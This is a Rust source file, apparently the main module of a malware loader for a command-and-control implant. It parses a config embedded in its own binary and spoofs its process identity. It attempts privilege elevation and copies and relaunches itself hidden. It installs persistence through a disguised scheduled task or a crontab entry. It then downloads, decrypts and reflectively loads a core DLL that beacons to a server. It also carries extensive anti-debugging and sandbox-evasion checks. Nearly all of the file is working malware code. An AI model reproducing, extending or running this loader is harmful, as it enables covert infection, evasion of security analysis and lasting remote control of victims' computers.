mod config;
mod dll_fetch;
mod elevation;
mod pe_loader;

use config::LoaderConfig;
use std::env;

macro_rules! log {
    ($($arg:tt)*) => {
        eprintln!($($arg)*);
        let _ = std::io::Write::flush(&mut std::io::stderr());
    };
}

fn main() {
    log!("[1/10] main() entered");

    let args: Vec<String> = env::args().collect();
    let is_boot = args.iter().any(|a| a == "--boot");
    let local_path = args.iter().position(|a| a == "--local").and_then(|i| args.get(i + 1)).cloned();
    log!("[2/10] args parsed, is_boot={}, local={}", is_boot, local_path.is_some());

    // Dev mode: --local <path> skips config injection, anti-analysis, elevation, persistence
    if let Some(ref path) = local_path {
        log!("[DEV] --local mode: loading {} directly", path);
        let dll_bytes = match std::fs::read(path) {
            Ok(b) => {
                log!("[DEV] read {} bytes", b.len());
                b
            }
            Err(e) => fatal_exit(&format!("[DEV] FAIL: read {}: {}", path, e)),
        };

        if dll_bytes.len() < 64 {
            fatal_exit("[DEV] FAIL: DLL too small");
        }

        log!("[DEV] reflective_load...");
        let entry_fn = match unsafe { pe_loader::reflective_load(&dll_bytes) } {
            Ok(f) => {
                log!("[DEV] reflective_load OK");
                f
            }
            Err(e) => fatal_exit(&format!("[DEV] FAIL: reflective_load: {}", e)),
        };

        // Pass a minimal config JSON for dev
        let dev_config = r#"{"server_url":"http://127.0.0.1:5000","register_path":"/api/beacon/register","heartbeat_path":"/api/beacon/heartbeat","result_path":"/api/beacon/result","ws_path":"/ws/agent","heartbeat_interval_ms":3000,"jitter_percent":0.2,"require_admin":false,"enable_persistence":false,"encrypted_aes_key":"","core_download_path":"","rsa_private_key":"","anti_analysis":{"enabled":false}}"#;
        log!("[DEV] calling core_main ({} bytes config)...", dev_config.len());
        entry_fn(dev_config.as_ptr(), dev_config.len());
        log!("[DEV] core_main returned!");
        std::process::exit(0);
    }

    // 1. Parse injected config from binary
    log!("[3/10] parsing injected config...");
    let (injected, raw_json) = match parse_injected_config() {
        Some((cfg, json)) => {
            log!("[3/10] config OK ({} bytes)", json.len());
            (cfg, json)
        }
        None => {
            fatal_exit("[3/10] FAIL: no LIBRA_CFG_BLOCK! magic found");
        }
    };

    let loader_cfg = LoaderConfig::from_injected(injected, raw_json);
    log!("[3/10] LoaderConfig created, server={}", loader_cfg.server_url);

    // 2. Anti-analysis
    log!("[4/10] anti_analysis.enabled={}", loader_cfg.anti_analysis.enabled);
    if loader_cfg.anti_analysis.enabled {
        log!("[4/10] running sandbox checks...");
        if is_sandbox(&loader_cfg.anti_analysis)
            || (loader_cfg.anti_analysis.check_debugger && check_debugger())
        {
            log!("[4/10] sandbox/debugger detected — sleeping forever");
            std::thread::sleep(std::time::Duration::from_secs(u64::MAX));
            std::process::exit(0);
        }
        log!("[4/10] sandbox checks passed");
    } else {
        log!("[4/10] anti-analysis disabled, skipping");
    }

    // 3. PEB spoofing
    log!("[5/10] spoof_peb...");
    elevation::spoof_peb("C:\\Windows\\System32\\RuntimeBroker.exe");
    log!("[5/10] spoof_peb done");

    // 4. Elevation
    if loader_cfg.require_admin {
        log!("[6/10] require_admin=true, trying elevation...");
        if elevation::is_admin() {
            log!("[6/10] already admin, continuing");
        } else {
            let exe = env::current_exe()
                .map(|p| p.to_string_lossy().to_string())
                .unwrap_or_default();
            if !exe.is_empty() {
                match elevation::try_elevate(&exe) {
                    Ok(true) => {
                        // Wait briefly to confirm elevated process is alive
                        log!("[6/10] elevated process spawned, waiting to confirm...");
                        std::thread::sleep(std::time::Duration::from_millis(2000));
                        if elevation::check_elevated_instance_running(&exe) {
                            log!("[6/10] confirmed elevated instance running, exiting");
                            std::process::exit(0);
                        } else {
                            log!("[6/10] elevated instance NOT detected, continuing in current process");
                        }
                    }
                    Ok(false) => {
                        log!("[6/10] already admin, continuing");
                    }
                    Err(_) => {
                        log!("[6/10] elevation failed, continuing without admin");
                    }
                }
            }
        }
    } else {
        log!("[6/10] require_admin=false, skipping");
    }

    // 5. Persistence
    if let Some(path) = loader_cfg.copy_to_path.as_deref() {
        if !path.is_empty() {
            log!("[7/10] copy_to_path={}, relaunching...", path);
            copy_and_relaunch(path);
        }
    }
    if loader_cfg.enable_persistence {
        log!("[7/10] installing persistence...");
        install_persistence();
    }
    log!("[7/10] persistence done");

    // 6. Load core DLL bytes (production: download + decrypt)
    log!("[8/10] decrypting AES key...");
    let mut aes_key = match dll_fetch::decrypt_aes_key(&loader_cfg.encrypted_aes_key, &loader_cfg.rsa_private_key) {
        Ok(k) => {
            log!("[8/10] AES key decrypted OK ({} bytes)", k.len());
            k
        }
        Err(e) => fatal_exit(&format!("[8/10] FAIL: AES key decrypt: {}", e)),
    };

    let download_url = loader_cfg.download_url();
    log!("[9/10] downloading core from {}...", download_url);

    let aes_key_clone = aes_key.clone();
    let download_result = std::thread::spawn(move || {
        let rt = tokio::runtime::Builder::new_current_thread()
            .enable_all()
            .build()
            .map_err(|e| format!("tokio runtime: {}", e))?;

        let encrypted = rt.block_on(dll_fetch::download_core(&download_url))
            .map_err(|e| format!("download: {}", e))?;

        let decrypted = dll_fetch::decrypt_dll(&encrypted, &aes_key_clone)
            .map_err(|e| format!("decrypt: {}", e))?;

        Ok::<(Vec<u8>, usize), String>((decrypted, encrypted.len()))
    }).join().unwrap_or(Err("download thread panic".into()));

    let dll_bytes = match download_result {
        Ok((decrypted, enc_len)) => {
            log!("[9/10] download OK ({} bytes), decrypt OK ({} bytes)", enc_len, decrypted.len());
            decrypted
        }
        Err(e) => fatal_exit(&format!("[9/10] FAIL: {}", e)),
    };

    use zeroize::Zeroize;
    aes_key.zeroize();

    // 9. Validate PE header (basic sanity check)
    if dll_bytes.len() < 64 {
        fatal_exit("[9/10] FAIL: payload too small");
    }
    #[cfg(target_os = "windows")]
    if dll_bytes[0] != 0x4D || dll_bytes[1] != 0x5A {
        fatal_exit("[9/10] FAIL: not a valid PE (MZ missing)");
    }
    log!("[9/10] PE validated ({} bytes)", dll_bytes.len());

    // 10. Reflective load
    log!("[10/10] reflective_load...");
    let entry_fn = match unsafe { pe_loader::reflective_load(&dll_bytes) } {
        Ok(f) => {
            log!("[10/10] reflective_load OK");
            f
        }
        Err(e) => {
            fatal_exit(&format!("[10/10] FAIL: reflective_load: {}", e));
        }
    };

    // 11. Call core_main — should never return
    let config_bytes = loader_cfg.config_json.as_bytes();
    log!("[10/10] calling core_main ({} bytes config)...", config_bytes.len());
    entry_fn(config_bytes.as_ptr(), config_bytes.len());

    // Should not reach here
    log!("[10/10] core_main returned! exiting...");
    std::process::exit(0);
}

// ── Fatal exit with visible output ────────────────────────────────────

fn fatal_exit(msg: &str) -> ! {
    log!("{}", msg);
    std::thread::sleep(std::time::Duration::from_millis(100));
    std::process::exit(1);
}

// ── Config Injection ──────────────────────────────────────────────────

use libra_common::models::{AntiAnalysisConfig, InjectedConfig, CONFIG_MAGIC};

fn parse_injected_config() -> Option<(InjectedConfig, String)> {
    let exe_path = env::current_exe().ok()?;
    log!("  exe: {}", exe_path.display());
    let data = std::fs::read(&exe_path).ok()?;
    log!("  read {} bytes", data.len());

    if data.len() < CONFIG_MAGIC.len() + 4 {
        log!("  too small for config block");
        return None;
    }

    let magic_pos = data
        .windows(CONFIG_MAGIC.len())
        .rposition(|w| w == CONFIG_MAGIC.as_slice())?;
    log!("  magic at offset 0x{:X}", magic_pos);

    let pos = magic_pos + CONFIG_MAGIC.len();
    if pos + 4 > data.len() {
        log!("  no length after magic");
        return None;
    }

    let len_bytes: [u8; 4] = data[pos..pos + 4].try_into().ok()?;
    let json_len = u32::from_le_bytes(len_bytes) as usize;
    let json_start = pos + 4;
    log!("  json_len={}", json_len);

    if json_start + json_len > data.len() {
        log!("  json extends past EOF");
        return None;
    }

    let json_bytes = &data[json_start..json_start + json_len];
    let json_str = std::str::from_utf8(json_bytes).ok()?;
    log!("  json: {}", &json_str[..json_str.len().min(200)]);

    let config: InjectedConfig = serde_json::from_str(json_str).ok()?;
    log!("  deserialization OK");
    Some((config, json_str.to_string()))
}

// ── Persistence (lightweight, no libra-modules dependency) ────────────

fn copy_and_relaunch(relative_path: &str) {
    let current_exe = match env::current_exe() {
        Ok(e) => e,
        Err(_) => return,
    };
    let current_dir = current_exe.parent().unwrap_or(std::path::Path::new("."));

    #[cfg(target_os = "windows")]
    let target_dir = {
        let appdata = env::var("APPDATA").unwrap_or_else(|_| "C:\\Users\\Default\\AppData\\Roaming".into());
        std::path::PathBuf::from(appdata).join(relative_path)
    };
    #[cfg(not(target_os = "windows"))]
    let target_dir = {
        let home = env::var("HOME").unwrap_or_else(|_| "/tmp".into());
        std::path::PathBuf::from(home).join(".local/share").join(relative_path)
    };

    if current_dir.canonicalize().ok() == target_dir.canonicalize().ok() {
        return;
    }

    let target_exe = target_dir.join(current_exe.file_name().unwrap_or_default());
    if std::fs::create_dir_all(&target_dir).is_err() {
        std::process::exit(0);
    }
    if std::fs::copy(&current_exe, &target_exe).is_err() {
        std::process::exit(0);
    }

    #[cfg(target_os = "windows")]
    {
        use std::os::windows::process::CommandExt;
        let _ = std::process::Command::new(&target_exe)
            .arg("--boot")
            .creation_flags(0x08000000)
            .spawn();
    }
    #[cfg(not(target_os = "windows"))]
    {
        let _ = std::process::Command::new(&target_exe)
            .arg("--boot")
            .spawn();
    }

    std::process::exit(0);
}

fn install_persistence() {
    #[cfg(target_os = "windows")]
    {
        use std::os::windows::process::CommandExt;
        let exe = match env::current_exe() {
            Ok(e) => e.to_string_lossy().to_string(),
            Err(_) => return,
        };
        let _ = std::process::Command::new("schtasks.exe")
            .args(["/create", "/tn", "SecurityHealthMonitor", "/tr", &exe, "/sc", "onlogon", "/rl", "highest", "/f"])
            .creation_flags(0x08000000)
            .stdout(std::process::Stdio::null())
            .stderr(std::process::Stdio::null())
            .status();
    }
    #[cfg(not(target_os = "windows"))]
    {
        let exe = match env::current_exe() {
            Ok(e) => e.to_string_lossy().to_string(),
            Err(_) => return,
        };
        let cron_line = format!("@reboot {} >/dev/null 2>&1", exe);
        let cmd = format!("(crontab -l 2>/dev/null; echo '{}') | crontab -", cron_line);
        let _ = std::process::Command::new("bash")
            .args(["-c", &cmd])
            .stdout(std::process::Stdio::null())
            .stderr(std::process::Stdio::null())
            .status();
    }
}

// ── Anti-analysis (inline, no libra-modules dependency) ───────────────

fn is_sandbox(cfg: &AntiAnalysisConfig) -> bool {
    (cfg.check_cpu_cores && check_cpu_cores(cfg.min_cpu_cores))
        || (cfg.check_memory && check_memory(cfg.min_memory_gb))
        || (cfg.check_vm_mac && check_vm_mac())
        || (cfg.check_disk_size && check_disk_size(cfg.min_disk_gb))
        || (cfg.check_username && check_username())
        || (cfg.check_usb_history && check_usb_history(cfg.min_usb_devices))
        || (cfg.check_test_signing && check_test_signing())
        || (cfg.check_delay_sandbox && check_delay_sandbox(cfg.delay_seconds))
        || (cfg.check_installed_software && check_installed_software(cfg.min_installed_software))
        || (cfg.check_screen_resolution && check_screen_resolution())
        || (cfg.check_process_count && check_process_count(cfg.min_processes))
        || (cfg.check_mouse_movement && check_mouse_movement(cfg.mouse_wait_seconds))
}

fn check_cpu_cores(min_cores: u32) -> bool {
    match std::thread::available_parallelism() {
        Ok(n) => (n.get() as u32) < min_cores,
        Err(_) => false,
    }
}

fn check_memory(min_gb: u32) -> bool {
    use sysinfo::System;
    let sys = System::new_with_specifics(
        sysinfo::RefreshKind::nothing()
            .with_memory(sysinfo::MemoryRefreshKind::everything()),
    );
    let total_mb = sys.total_memory() / (1024 * 1024);
    total_mb < (min_gb as u64 * 1024)
}

// ── Anti-debug ────────────────────────────────────────────────────────

fn check_debugger() -> bool {
    #[cfg(target_os = "windows")]
    {
        check_peb_being_debugged()
            || check_nt_global_flag()
            || check_hardware_breakpoints()
            || check_remote_debugger()
    }
    #[cfg(not(target_os = "windows"))]
    {
        check_ptrace_traceme() || check_tracer_pid()
    }
}

/// PEB->BeingDebugged (byte at PEB+0x2): set to 1 when process is debugged.
#[cfg(target_os = "windows")]
fn check_peb_being_debugged() -> bool {
    unsafe {
        let peb: *const u8;
        std::arch::asm!("mov {}, gs:[0x60]", out(reg) peb);
        if peb.is_null() { return false; }
        *(peb.add(2)) != 0
    }
}



/// PEB->NtGlobalFlag: FLG_HEAP_ENABLE_TAIL_CHECK | FLG_HEAP_ENABLE_FREE_CHECK | FLG_HEAP_VALIDATE_PARAMETERS
/// Set by default when a process is started under a debugger.
#[cfg(target_os = "windows")]
fn check_nt_global_flag() -> bool {
    unsafe {
        // Read PEB via TEB (gs:0x60 on x64)
        let peb: *const u8;
        std::arch::asm!("mov {}, gs:[0x60]", out(reg) peb);
        if peb.is_null() {
            return false;
        }
        // NtGlobalFlag is at PEB+0xBC on x64
        let nt_global_flag = *(peb.add(0xBC) as *const u32);
        const FLG_HEAP_ENABLE_TAIL_CHECK: u32 = 0x10;
        const FLG_HEAP_ENABLE_FREE_CHECK: u32 = 0x20;
        const FLG_HEAP_VALIDATE_PARAMETERS: u32 = 0x40;
        nt_global_flag & (FLG_HEAP_ENABLE_TAIL_CHECK | FLG_HEAP_ENABLE_FREE_CHECK | FLG_HEAP_VALIDATE_PARAMETERS) != 0
    }
}

/// Check hardware breakpoints by reading DR0-DR3 via GetThreadContext.
/// Debuggers set hardware breakpoints by writing to debug registers.
#[cfg(target_os = "windows")]
fn check_hardware_breakpoints() -> bool {
    use std::mem;

    #[repr(C, align(16))]
    struct Context64 {
        _p1_home: u64, _p2_home: u64, _p3_home: u64, _p4_home: u64,
        _p5_home: u64, _p6_home: u64, _context_flags: u32,
        _mx_csr: u32,
        _seg_cs: u16, _seg_ds: u16, _seg_es: u16, _seg_fs: u16, _seg_gs: u16, _seg_ss: u16,
        _eflags: u32, _dr0: u64, _dr1: u64, _dr2: u64, _dr3: u64,
        _dr6: u64, _dr7: u64,
        _rax: u64, _rcx: u64, _rdx: u64, _rbx: u64,
        _rsp: u64, _rbp: u64, _rsi: u64, _rdi: u64,
        _r8: u64, _r9: u64, _r10: u64, _r11: u64,
        _r12: u64, _r13: u64, _r14: u64, _r15: u64,
        _rip: u64,
        // ... rest omitted, we only need Dr0-Dr3
    }

    extern "system" {
        fn GetThreadContext(hthread: *mut std::ffi::c_void, lpcontext: *mut Context64) -> i32;
        fn GetCurrentThread() -> *mut std::ffi::c_void;
    }

    unsafe {
        let mut ctx: Context64 = mem::zeroed();
        // CONTEXT_DEBUG_REGISTERS = 0x00100010
        // CONTEXT_ALL = 0x0010001F (we need DR flags)
        ctx._context_flags = 0x00100010;
        if GetThreadContext(GetCurrentThread(), &mut ctx) != 0 {
            // If any debug register is set, a debugger is present
            return ctx._dr0 != 0 || ctx._dr1 != 0 || ctx._dr2 != 0 || ctx._dr3 != 0;
        }
        false
    }
}

/// Check IsDebuggerPresent and NtQueryInformationProcess(DebugPort)
#[cfg(target_os = "windows")]
fn check_remote_debugger() -> bool {
    unsafe {
        extern "system" {
            fn IsDebuggerPresent() -> i32;
            fn LoadLibraryA(lpFileName: *const u8) -> *mut u8;
            fn GetProcAddress(hModule: *mut u8, lpProcName: *const u8) -> *mut u8;
        }

        if IsDebuggerPresent() != 0 {
            return true;
        }

        // NtQueryInformationProcess(ProcessDebugPort = 7)
        type NtQIP = unsafe extern "system" fn(
            *mut std::ffi::c_void, u32, *mut u8, u32, *mut u32,
        ) -> i32;

        let ntdll = LoadLibraryA(b"ntdll.dll\0".as_ptr());
        if ntdll.is_null() {
            return false;
        }
        let proc = GetProcAddress(ntdll, b"NtQueryInformationProcess\0".as_ptr());
        if proc.is_null() {
            return false;
        }
        let nt_query: NtQIP = std::mem::transmute(proc);
        let mut debug_port: usize = 0;
        // ProcessDebugPort = 7
        let status = nt_query(
            std::ptr::null_mut(),
            7,
            &mut debug_port as *mut usize as *mut u8,
            std::mem::size_of::<usize>() as u32,
            std::ptr::null_mut(),
        );
        status == 0 && debug_port != 0
    }
}

/// Linux: check if /proc/self/status shows TracerPid != 0
#[cfg(target_os = "linux")]
fn check_tracer_pid() -> bool {
    if let Ok(status) = std::fs::read_to_string("/proc/self/status") {
        for line in status.lines() {
            if line.starts_with("TracerPid:") {
                let pid_str = line["TracerPid:".len()..].trim();
                if let Ok(pid) = pid_str.parse::<u32>() {
                    return pid != 0;
                }
            }
        }
    }
    false
}

/// Linux: try ptrace(PTRACE_TRACEME) — fails if already traced
#[cfg(target_os = "linux")]
fn check_ptrace_traceme() -> bool {
    const PTRACE_TRACEME: i64 = 0;
    unsafe {
        // If we're already being traced, ptrace returns -1
        libc::ptrace(PTRACE_TRACEME, 0, 0, 0) == -1
    }
}

// ── VM / sandbox environment checks ───────────────────────────────────

/// Check if any network adapter MAC prefix matches known VM vendors.
/// VMware: 00:0C:29, 00:50:56 | VirtualBox: 08:00:27 | Hyper-V: 00:15:5D
fn check_vm_mac() -> bool {
    #[cfg(target_os = "windows")]
    {
        use std::os::windows::process::CommandExt;
        if let Ok(output) = std::process::Command::new("wmic")
            .args(["nic", "where", "PhysicalAdapter=TRUE", "get", "MACAddress", "/format:csv"])
            .creation_flags(0x08000000)
            .stdout(std::process::Stdio::piped())
            .stderr(std::process::Stdio::null())
            .output()
        {
            let text = String::from_utf8_lossy(&output.stdout);
            for line in text.lines().skip(2) {
                if let Some(mac) = line.split(',').last() {
                    let mac_clean = mac.trim().replace('-', ":").to_lowercase();
                    if mac_clean.starts_with("00:0c:29")
                        || mac_clean.starts_with("00:50:56")
                        || mac_clean.starts_with("08:00:27")
                        || mac_clean.starts_with("00:15:5d")
                    {
                        return true;
                    }
                }
            }
        }
        false
    }
    #[cfg(target_os = "linux")]
    {
        if let Ok(entries) = std::fs::read_dir("/sys/class/net") {
            for entry in entries.flatten() {
                let mac_path = entry.path().join("address");
                if let Ok(mac) = std::fs::read_to_string(&mac_path) {
                    let mac = mac.trim().to_lowercase();
                    if mac.starts_with("00:0c:29")
                        || mac.starts_with("00:50:56")
                        || mac.starts_with("08:00:27")
                        || mac.starts_with("00:15:5d")
                    {
                        return true;
                    }
                }
            }
        }
        false
    }
    #[cfg(not(any(target_os = "windows", target_os = "linux")))]
    { false }
}

/// Check if the system disk is smaller than 60 GB (typical VM/sandbox).
fn check_disk_size(min_gb: u32) -> bool {
    use sysinfo::Disks;
    let disks = Disks::new_with_refreshed_list();
    let total: u64 = disks.iter().map(|d| d.total_space()).sum();
    total < (min_gb as u64) * 1024 * 1024 * 1024
}

/// Check if the current username matches known sandbox/analysis names.
fn check_username() -> bool {
    let username = std::env::var("USERNAME")
        .or_else(|_| std::env::var("USER"))
        .unwrap_or_default()
        .to_lowercase();

    const SUSPICIOUS_NAMES: &[&str] = &[
        "admin", "administrator", "malware", "maltest", "sandbox",
        "user", "test", "virus", "sample", "john", "abc",
        "cuckoo", "cape", "vbox", "vmware", "honey",
        "analyst", "analysis", "lab", "researcher",
    ];

    for name in SUSPICIOUS_NAMES {
        if username == *name {
            return true;
        }
    }
    false
}

/// Check USB device history count via registry.
fn check_usb_history(min_devices: u32) -> bool {
    #[cfg(target_os = "windows")]
    {
        use std::os::windows::process::CommandExt;
        if let Ok(output) = std::process::Command::new("reg")
            .args(["query", r"HKLM\SYSTEM\ControlSet001\Enum\USBSTOR"])
            .creation_flags(0x08000000)
            .stdout(std::process::Stdio::piped())
            .stderr(std::process::Stdio::null())
            .output()
        {
            let text = String::from_utf8_lossy(&output.stdout);
            let subkey_count = text.lines()
                .filter(|l| l.trim().starts_with("HKEY_LOCAL_MACHINE"))
                .count();
            return (subkey_count as u32) < min_devices;
        }
        false
    }
    #[cfg(not(target_os = "windows"))]
    { let _ = min_devices; false }
}

/// Check if Windows Test Signing mode is enabled (common in analysis environments).
fn check_test_signing() -> bool {
    #[cfg(target_os = "windows")]
    {
        use std::os::windows::process::CommandExt;
        if let Ok(output) = std::process::Command::new("bcdedit")
            .args(["/enum", "{current}"])
            .creation_flags(0x08000000)
            .stdout(std::process::Stdio::piped())
            .stderr(std::process::Stdio::null())
            .output()
        {
            let text = String::from_utf8_lossy(&output.stdout).to_lowercase();
            return text.contains("testsigning") && text.contains("yes");
        }
        false
    }
    #[cfg(not(target_os = "windows"))]
    { false }
}

/// Delay-based anti-sandbox: sleep for N seconds, verify elapsed time matches.
/// Sandboxes often fast-forward or skip sleep calls.
fn check_delay_sandbox(delay_seconds: u32) -> bool {
    let before = std::time::Instant::now();
    std::thread::sleep(std::time::Duration::from_secs(delay_seconds as u64));
    let elapsed = before.elapsed().as_secs();
    elapsed < (delay_seconds as u64).saturating_sub(1)
}

/// Check installed software count via registry Uninstall keys.
/// Real machines typically have 50+ entries; sandboxes have very few.
fn check_installed_software(min_count: u32) -> bool {
    #[cfg(target_os = "windows")]
    {
        use std::os::windows::process::CommandExt;
        let paths = [
            r"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall",
            r"HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall",
        ];
        let mut total = 0u32;
        for path in paths {
            if let Ok(output) = std::process::Command::new("reg")
                .args(["query", path])
                .creation_flags(0x08000000)
                .stdout(std::process::Stdio::piped())
                .stderr(std::process::Stdio::null())
                .output()
            {
                let text = String::from_utf8_lossy(&output.stdout);
                total += text.lines()
                    .filter(|l| l.trim().starts_with("HKEY_"))
                    .count() as u32;
            }
        }
        total < min_count
    }
    #[cfg(not(target_os = "windows"))]
    { let _ = min_count; false }
}

/// Check screen resolution — sandboxes often use low/unusual resolutions like 1024x768.
fn check_screen_resolution() -> bool {
    #[cfg(target_os = "windows")]
    {
        extern "system" {
            fn GetSystemMetrics(nIndex: i32) -> i32;
        }
        const SM_CXSCREEN: i32 = 0;
        const SM_CYSCREEN: i32 = 1;
        unsafe {
            let w = GetSystemMetrics(SM_CXSCREEN);
            let h = GetSystemMetrics(SM_CYSCREEN);
            // Suspicious: exactly 1024x768, 800x600, or width < 1200
            w < 1200 || h < 800 || (w == 1024 && h == 768)
        }
    }
    #[cfg(not(target_os = "windows"))]
    { false }
}

/// Check running process count — real systems typically have 80+ processes.
fn check_process_count(min_count: u32) -> bool {
    #[cfg(target_os = "windows")]
    {
        extern "system" {
            fn CreateToolhelp32Snapshot(dwFlags: u32, th32ProcessID: u32) -> *mut std::ffi::c_void;
            fn Process32FirstW(hSnapshot: *mut std::ffi::c_void, lppe: *mut [u8; 568]) -> i32;
            fn Process32NextW(hSnapshot: *mut std::ffi::c_void, lppe: *mut [u8; 568]) -> i32;
            fn CloseHandle(hObject: *mut std::ffi::c_void) -> i32;
        }
        const TH32CS_SNAPPROCESS: u32 = 0x00000002;

        unsafe {
            let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
            if snapshot == -1isize as *mut std::ffi::c_void {
                return false;
            }
            let mut pe = [0u8; 568];
            // dwSize at offset 0, u32
            pe[0..4].copy_from_slice(&568u32.to_le_bytes());
            let mut count = 0u32;
            if Process32FirstW(snapshot, &mut pe) != 0 {
                count += 1;
                while Process32NextW(snapshot, &mut pe) != 0 {
                    count += 1;
                }
            }
            CloseHandle(snapshot);
            count < min_count
        }
    }
    #[cfg(not(target_os = "windows"))]
    { let _ = min_count; false }
}

/// Check for real mouse movement within a time window.
/// If no cursor position change is detected, it's likely a sandbox with no user interaction.
fn check_mouse_movement(wait_seconds: u32) -> bool {
    #[cfg(target_os = "windows")]
    {
        #[repr(C)]
        struct POINT { x: i32, y: i32 }

        extern "system" {
            fn GetCursorPos(lpPoint: *mut POINT) -> i32;
        }

        unsafe {
            let mut p1 = POINT { x: 0, y: 0 };
            GetCursorPos(&mut p1);

            std::thread::sleep(std::time::Duration::from_secs(wait_seconds as u64));

            let mut p2 = POINT { x: 0, y: 0 };
            GetCursorPos(&mut p2);

            // No movement at all — likely automated
            p1.x == p2.x && p1.y == p2.y
        }
    }
    #[cfg(not(target_os = "windows"))]
    { let _ = wait_seconds; false }
}
